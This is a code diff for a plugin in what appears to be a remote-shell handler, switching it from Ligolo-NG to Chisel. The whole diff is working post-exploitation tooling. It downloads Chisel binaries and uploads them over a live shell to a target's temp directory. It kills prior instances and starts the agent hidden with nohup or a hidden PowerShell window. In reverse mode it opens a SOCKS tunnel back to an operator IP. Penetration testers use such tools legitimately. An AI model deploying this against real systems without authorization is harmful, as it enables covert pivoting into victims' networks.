@@ -1,13 +1,13 @@
 """
-Ligolo-NG tunneling plugin.
+Chisel tunneling plugin.
 Manages agent binaries, transfers them using chunked upload with integrity checks,
-and executes the agent as a persistent background process.
+and executes the agent in reverse (client) or bind (server) mode as a background process.
 """
 
 import argparse
+import gzip
 import os
 import shutil
-import tarfile
 import time
 import urllib.request
 import zipfile
@@ -21,14 +21,14 @@ from ..api import plugin, SessionContext
 from ...constants import PLUGIN_MARK_END, PLUGIN_MARK_START
 
 PLUGIN_DIR = os.path.dirname(os.path.abspath(__file__))
-BIN_DIR = os.path.join(os.path.dirname(os.path.dirname(PLUGIN_DIR)), 'ligolo_binaries')
-VERSION_FILE = os.path.join(BIN_DIR, 'ligolo_version.txt')
+BIN_DIR = os.path.join(os.path.dirname(os.path.dirname(PLUGIN_DIR)), 'chisel_binaries')
+VERSION_FILE = os.path.join(BIN_DIR, 'chisel_version.txt')
 
-LIGOLO_LINUX = 'ligolong-linux'
-LIGOLO_WIN = 'ligolong-windows.exe'
+CHISEL_LINUX = 'chisel_linux'
+CHISEL_WIN = 'chisel_windows.exe'
 
-GITHUB_API_LATEST = "https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest"
-FALLBACK_VERSION = "0.9.1"
+GITHUB_API_LATEST = "https://api.github.com/repos/jpillora/chisel/releases/latest"
+FALLBACK_VERSION = "1.12.0"
 
 _CACHED_VERSION = None
 
@@ -47,13 +47,14 @@ def _get_latest_version(session):
                 version = tag[1:]
             else:
                 version = tag
-            session.print(f"Latest Ligolo-NG version: {version}", 'green')
+            session.print(f"Latest Chisel version: {version}", 'green')
             _CACHED_VERSION = version
             return version
     except Exception as e:
         session.print(f"Could not fetch latest version: {e}. Falling back to {FALLBACK_VERSION}", 'yellow')
         _CACHED_VERSION = FALLBACK_VERSION
         return _CACHED_VERSION
+
 
 def _read_stored_version():
     """Read the version of currently cached binaries."""
@@ -62,14 +63,17 @@ def _read_stored_version():
             return f.read().strip()
     return None
 
+
 def _write_stored_version(version):
     """Store the version of the binaries we have."""
     with open(VERSION_FILE, 'w') as f:
         f.write(version)
 
+
 def _ensure_bin_dir():
     if not os.path.exists(BIN_DIR):
         os.makedirs(BIN_DIR, exist_ok=True)
+
 
 def _download_file(url, dest_path):
     try:
@@ -85,59 +89,47 @@ def _download_file(url, dest_path):
     except Exception:
         return False
 
+
 def _download_and_extract_linux(session, version):
     _ensure_bin_dir()
-    filename = f'ligolo-ng_agent_{version}_linux_amd64.tar.gz'
+    filename = f'chisel_{version}_linux_amd64.gz'
     archive = os.path.join(BIN_DIR, filename)
-    url = f'https://github.com/nicocha30/ligolo-ng/releases/download/v{version}/{filename}'
+    url = f'https://github.com/jpillora/chisel/releases/download/v{version}/{filename}'
     session.print("Downloading Linux agent...", 'yellow')
     if not _download_file(url, archive):
         session.print("Linux download failed.", 'red')
         return False
 
-    extract_dir = os.path.join(BIN_DIR, 'ligolo_linux_extract')
-    os.makedirs(extract_dir, exist_ok=True)
+    extracted_name = f'chisel_{version}_linux_amd64'
+    extracted_path = os.path.join(BIN_DIR, extracted_name)
     try:
-        with tarfile.open(archive, 'r:gz') as tar:
-            tar.extractall(path=extract_dir)
+        with gzip.open(archive, 'rb') as gz:
+            with open(extracted_path, 'wb') as out:
+                shutil.copyfileobj(gz, out)
     except Exception as e:
         session.print(f"Extraction error: {e}", 'red')
-        shutil.rmtree(extract_dir, ignore_errors=True)
         os.remove(archive)
         return False
 
-    subdir_name = f'ligolo-ng_agent_{version}_linux_amd64'
-    agent_path = os.path.join(extract_dir, subdir_name, 'agent')
-    if not os.path.isfile(agent_path):
-        for root, _, files in os.walk(extract_dir):
-            if 'agent' in files:
-                agent_path = os.path.join(root, 'agent')
-                break
-        else:
-            session.print("Could not find 'agent' in extracted archive.", 'red')
-            shutil.rmtree(extract_dir, ignore_errors=True)
-            os.remove(archive)
-            return False
-
-    target = os.path.join(BIN_DIR, LIGOLO_LINUX)
-    shutil.move(agent_path, target)
+    target = os.path.join(BIN_DIR, CHISEL_LINUX)
+    shutil.move(extracted_path, target)
     os.chmod(target, 0o755)
-    shutil.rmtree(extract_dir, ignore_errors=True)
     os.remove(archive)
     session.print("Linux agent ready.", 'green')
     return True
 
+
 def _download_and_extract_windows(session, version):
     _ensure_bin_dir()
-    filename = f'ligolo-ng_agent_{version}_windows_amd64.zip'
+    filename = f'chisel_{version}_windows_amd64.zip'
     archive = os.path.join(BIN_DIR, filename)
-    url = f'https://github.com/nicocha30/ligolo-ng/releases/download/v{version}/{filename}'
+    url = f'https://github.com/jpillora/chisel/releases/download/v{version}/{filename}'
     session.print("Downloading Windows agent...", 'yellow')
     if not _download_file(url, archive):
         session.print("Windows download failed.", 'red')
         return False
 
-    extract_dir = os.path.join(BIN_DIR, 'ligolo_windows_extract')
+    extract_dir = os.path.join(BIN_DIR, 'chisel_windows_extract')
     os.makedirs(extract_dir, exist_ok=True)
     try:
         with zipfile.ZipFile(archive, 'r') as zf:
@@ -148,21 +140,22 @@ def _download_and_extract_windows(session, version):
         os.remove(archive)
         return False
 
-    subdir_name = f'ligolo-ng_agent_{version}_windows_amd64'
-    agent_path = os.path.join(extract_dir, subdir_name, 'agent.exe')
-    if not os.path.isfile(agent_path):
-        for root, _, files in os.walk(extract_dir):
-            if 'agent.exe' in files:
-                agent_path = os.path.join(root, 'agent.exe')
+    exe_path = None
+    for root, _, files in os.walk(extract_dir):
+        for f in files:
+            if f.lower().endswith('.exe') and 'chisel' in f.lower():
+                exe_path = os.path.join(root, f)
                 break
-        else:
-            session.print("Could not find 'agent.exe' in extracted archive.", 'red')
-            shutil.rmtree(extract_dir, ignore_errors=True)
-            os.remove(archive)
-            return False
+        if exe_path:
+            break
+    if not exe_path:
+        session.print("Could not find chisel.exe in extracted archive.", 'red')
+        shutil.rmtree(extract_dir, ignore_errors=True)
+        os.remove(archive)
+        return False
 
-    target = os.path.join(BIN_DIR, LIGOLO_WIN)
-    shutil.move(agent_path, target)
+    target = os.path.join(BIN_DIR, CHISEL_WIN)
+    shutil.move(exe_path, target)
     shutil.rmtree(extract_dir, ignore_errors=True)
     os.remove(archive)
     session.print("Windows agent ready.", 'green')
@@ -171,11 +164,11 @@ def _download_and_extract_windows(session, version):
 
 def ensure_binaries(session):
     _ensure_bin_dir()
-    linux_path = os.path.join(BIN_DIR, LIGOLO_LINUX)
-    win_path = os.path.join(BIN_DIR, LIGOLO_WIN)
+    linux_path = os.path.join(BIN_DIR, CHISEL_LINUX)
+    win_path = os.path.join(BIN_DIR, CHISEL_WIN)
 
     if os.path.isfile(linux_path) and os.path.isfile(win_path):
-        session.print("Ligolo-NG binaries are available. Continuing...", 'green')
+        session.print("Chisel binaries are available. Continuing...", 'green')
         return True
 
     version = _get_latest_version(session)
@@ -187,7 +180,7 @@ def ensure_binaries(session):
             return False
 
     _write_stored_version(version)
-    session.print("Both Ligolo-NG binaries are ready.", 'green')
+    session.print("Both Chisel binaries are ready.", 'green')
     return True
 
 def _format_size(nbytes):
@@ -198,7 +191,6 @@ def _format_size(nbytes):
     return f"{nbytes:.1f} TB"
 
 def _remote_sha256_safe(session, remote_path, shell_type):
-    """Return remote sha256, or None if the file isn't there / can't be hashed."""
     handler = session._handler
     sock = session._client_sock
     try:
@@ -212,11 +204,10 @@ def _kill_and_remove_remote(session, remote_path, shell_type):
     sock = session._client_sock
 
     if shell_type in ('linux', 'unix'):
-        session.print("Cleaning up previous ligolo agent...", 'yellow')
+        session.print("Cleaning up previous chisel instance...", 'yellow')
         handler._flush_shell(sock, timeout=1.0)
         cmd = (
-            "pkill -9 -x ligolong 2>/dev/null; "
-            "pkill -9 -x agent 2>/dev/null; "
+            "pkill -9 -x chisel 2>/dev/null; "
             "sleep 0.3; "
             f"rm -f {remote_path} 2>/dev/null; "
             "echo CLEANED\n"
@@ -227,8 +218,7 @@ def _kill_and_remove_remote(session, remote_path, shell_type):
     else:
         safe_path = remote_path.replace("'", "''")
         ps = (
-            "Stop-Process -Name ligolong -Force -ErrorAction SilentlyContinue; "
-            "Stop-Process -Name agent -Force -ErrorAction SilentlyContinue; "
+            "Stop-Process -Name chisel -Force -ErrorAction SilentlyContinue; "
             "Start-Sleep -Milliseconds 400; "
             f"Remove-Item -Force -ErrorAction SilentlyContinue '{safe_path}'; "
             "echo CLEANED"
@@ -239,10 +229,6 @@ def _kill_and_remove_remote(session, remote_path, shell_type):
         handler.recv_output(sock, timeout=2.0)
 
 def _upload_file(session, local_path, remote_path, resume=False):
-    """
-    Upload a file to the target using chunked writes (Linux/Unix) or HTTP fallback (Windows).
-    Returns True on success, False otherwise.
-    """
     handler = session._handler
     sock = session._client_sock
     colors = handler.colors
@@ -411,15 +397,15 @@ def _upload_file(session, local_path, remote_path, resume=False):
         return False
 
 @plugin.command(
-    name='ligolong',
+    name='chisel',
     platforms=['linux', 'windows', 'unix'],
-    description='Deploy Ligolo-NG agent to target as a background tunnel.',
+    description='Deploy Chisel agent to target in reverse (client) or bind (server) mode.',
 )
 def run(session: SessionContext, args):
-    parser = argparse.ArgumentParser(prog='ligolo', description='Ligolo-NG agent deployment')
-    parser.add_argument('-i', '--ip', required=True, help='IP address for agent to connect to')
-    parser.add_argument('-p', '--port', required=True, type=int, help='Port for agent to connect to')
-    parser.add_argument('-k', '--ignore-tls', action='store_true', help='Ignore TLS certificate validation')
+    parser = argparse.ArgumentParser(prog='chisel', description='Chisel agent deployment')
+    parser.add_argument('mode', choices=['reverse', 'bind'], help='Mode: reverse (client) or bind (server)')
+    parser.add_argument('-i', '--ip', help='IP address for reverse connection (required for reverse mode)')
+    parser.add_argument('-p', '--port', required=True, type=int, help='Port to connect to (reverse) or listen on (bind)')
 
     try:
         parsed = parser.parse_args(args)
@@ -430,8 +416,12 @@ def run(session: SessionContext, args):
         session.print("Port must be between 1 and 65535.", 'red')
         return 1
 
-    session.log_event('Ligolo plugin started')
-    session.print(f"Deploying Ligolo-NG agent to {parsed.ip}:{parsed.port}", 'yellow')
+    if parsed.mode == 'reverse' and not parsed.ip:
+        session.print("Reverse mode requires -i/--ip.", 'red')
+        return 1
+
+    session.log_event('Chisel plugin started')
+    session.print(f"Chisel mode: {parsed.mode}, port {parsed.port}", 'yellow')
 
     if not ensure_binaries(session):
         session.print("Binary preparation failed.", 'red')
@@ -446,11 +436,11 @@ def run(session: SessionContext, args):
 
     shell_type = info.get('type', 'unknown')
     if shell_type == 'windows':
-        local_bin = os.path.join(BIN_DIR, LIGOLO_WIN)
-        remote_path = 'C:\\Windows\\Temp\\ligolong.exe'
+        local_bin = os.path.join(BIN_DIR, CHISEL_WIN)
+        remote_path = 'C:\\Windows\\Temp\\chisel.exe'
     elif shell_type in ('linux', 'unix'):
-        local_bin = os.path.join(BIN_DIR, LIGOLO_LINUX)
-        remote_path = '/tmp/ligolong'
+        local_bin = os.path.join(BIN_DIR, CHISEL_LINUX)
+        remote_path = '/tmp/chisel'
     else:
         session.print(f"Unsupported target OS: {shell_type}", 'red')
         return 1
@@ -479,32 +469,35 @@ def run(session: SessionContext, args):
         time.sleep(0.5)
         handler.recv_output(sock, timeout=2.0)
 
-    connect_arg = f"-connect {parsed.ip}:{parsed.port}"
-    tls_arg = '-ignore-cert' if parsed.ignore_tls else ''
-    agent_cmd = f"{remote_path} {connect_arg} {tls_arg}".strip()
+    if parsed.mode == 'reverse':
+        cmd_args = f"client -v {parsed.ip}:{parsed.port} R:socks"
+    else:
+        cmd_args = f"server -v -p {parsed.port} --socks5"
 
-    session.print("Starting agent in background...", 'yellow')
+    full_cmd = f"{remote_path} {cmd_args}".strip()
+
+    session.print(f"Starting Chisel in background: {full_cmd}", 'yellow')
     handler._flush_shell(sock, timeout=1.0)
 
     if shell_type in ('linux', 'unix'):
-        cmd = f"nohup {agent_cmd} > /dev/null 2>&1 & echo $!\n"
+        cmd = f"nohup {full_cmd} > /dev/null 2>&1 & echo $!\n"
         sock.sendall(cmd.encode())
         time.sleep(2.0)
-        session.print("Agent started (no confirmation).", 'green')
+        session.print("Chisel started (no confirmation).", 'green')
     else:
-        args_str = f"{connect_arg} {tls_arg}".strip()
         safe_path = remote_path.replace("'", "''")
+        safe_args = cmd_args.replace("'", "''")
+        ps_cmd = (
+            f"Start-Process -FilePath '{safe_path}' -ArgumentList '{safe_args}' -WindowStyle Hidden; "
+            f"echo {PLUGIN_MARK_START}OK{PLUGIN_MARK_END}"
+        )
+        full_ps = f'powershell -Command "{ps_cmd}"\n'
+        sock.sendall(full_ps.encode())
 
-        ps_cmd = f"Start-Process -FilePath '{safe_path}' -ArgumentList '{args_str}' -WindowStyle Hidden; echo {PLUGIN_MARK_START}OK{PLUGIN_MARK_END}"
-        full_cmd = f'powershell -Command "{ps_cmd}"\n'
-
-        session.print(f"Executing: {full_cmd.strip()}", 'yellow')
-        sock.sendall(full_cmd.encode())
-
-        start = time.time()
         output = b''
         m_start = PLUGIN_MARK_START.encode()
         m_end = PLUGIN_MARK_END.encode()
+        start = time.time()
         while time.time() - start < 15.0:
             try:
                 chunk = sock.recv(4096)
@@ -518,19 +511,19 @@ def run(session: SessionContext, args):
 
         if m_start in output and m_end in output:
             session.print("PowerShell command executed successfully.", 'green')
-            sock.sendall(b'tasklist | findstr ligolong.exe\n')
+            sock.sendall(b'tasklist | findstr chisel.exe\n')
             time.sleep(1)
             task_output = handler.recv_output(sock, timeout=2.0)
-            if task_output and 'ligolong.exe' in task_output:
+            if task_output and 'chisel.exe' in task_output:
                 session.print("Agent is running (found in tasklist).", 'green')
             else:
                 session.print("Agent NOT found in tasklist – it may have crashed or exited immediately.", 'red')
                 session.print(f"tasklist output: {task_output}", 'yellow')
-            session.log_plugin_result('ligolo', 'success', 'agent confirmed')
+            session.log_plugin_result('chisel', 'success', 'agent confirmed')
         else:
             session.print("PowerShell command execution not confirmed (marker not received).", 'red')
-            session.log_plugin_result('ligolo', 'error', 'no confirmation')
+            session.log_plugin_result('chisel', 'error', 'no confirmation')
 
-    session.print("Ligolo-NG deployment completed.", 'green')
-    session.log_event('Ligolo plugin finished')
+    session.print("Chisel deployment completed.", 'green')
+    session.log_event('Chisel plugin finished')
     return 0
